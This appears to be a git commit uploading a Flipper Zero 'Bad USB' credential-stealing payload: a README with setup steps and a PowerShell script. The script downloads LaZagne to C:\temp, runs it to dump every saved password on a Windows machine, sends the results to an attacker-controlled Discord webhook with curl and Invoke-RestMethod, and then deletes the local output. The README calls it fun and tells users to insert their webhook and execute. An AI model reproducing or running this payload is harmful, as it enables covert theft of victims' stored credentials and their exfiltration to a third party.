e54e5cf9a1ee3f51f46e867f452c87b264a86a4e
theredhammer <118747418+theredhammer@users.noreply.github.com>
2022-12-30 13:48:56 +0100

    Add files via upload

---
+++ fast/README.md
@@ -0,0 +1,27 @@
+# Flipper Zero Bad USB feats Lazagne
+
+Currently only for windows 10 and 11
+
+I came with the idea after trying and testing some paylodas from https://github.com/I-Am-Jakoby/ <a href="https://github.com/I-Am-Jakoby/">
+
+Still a repo under testing but there are 2 options:
+
+- 1 slow one: is all done in ducky script, sends you the resaults via email you have to change your smtp credentials
+- 2 Fast one: A simple ducky script request a link were the payload is  alocated
+
+### Instructions
+
+At the momento only avaiable for discord webhook
+
+Fork and clone the repository
+Search por dc in the code and change it with your discord webhook link. Right now do it in both .txt and .ps1. (In the next days i will change it to just do it on the .txt)
+Upload your changes
+Get raw view from the payload and copy the link. 
+make it shorter with https://link.iamjakoby.com/ and option 307
+copi that link and put it in the .txt file. 
+Copy to your flipper zero and execute!
+
+Have fun!!
+
+Any error or problem please open a issue, is my first payload and probably doesnt worak as expected in all computers.
+
---
+++ fast/lazagne_auto.ps1
@@ -0,0 +1,50 @@
+﻿function Create-Folder {
+    param(
+        [string]$folderPath
+    )
+
+    New-Item -ItemType Directory -Path $folderPath
+}
+
+
+Create-Folder -folderPath "C:\temp"
+
+$dir = "C:\temp"
+function Run-Lazagne {
+    # Descarga Lazagne en un directorio temporal
+    Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "$dir\lazagne.exe"
+
+    # Ejecuta Lazagne y guarda el resultado en un archivo llamado "resultado.txt"
+    & "$dir\lazagne.exe" all > "$dir\output.txt"
+}
+
+Run-Lazagne
+
+function Upload-Discord {
+
+    [CmdletBinding()]
+    param (
+        [parameter(Position = 0, Mandatory = $False)]
+        [string]$file,
+        [parameter(Position = 1, Mandatory = $False)]
+        [string]$text 
+    )
+
+    $hookurl = "$dc"
+
+    $Body = @{
+        'username' = $env:username
+        'content'  = $text
+    }
+
+    if (-not ([string]::IsNullOrEmpty($text))) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+    };
+
+    if (-not ([string]::IsNullOrEmpty($file))) { curl.exe -F "file1=@$file" $hookurl }
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))) { Upload-Discord -file $dir\output.txt }
+
+
+RI $dir/output.txt
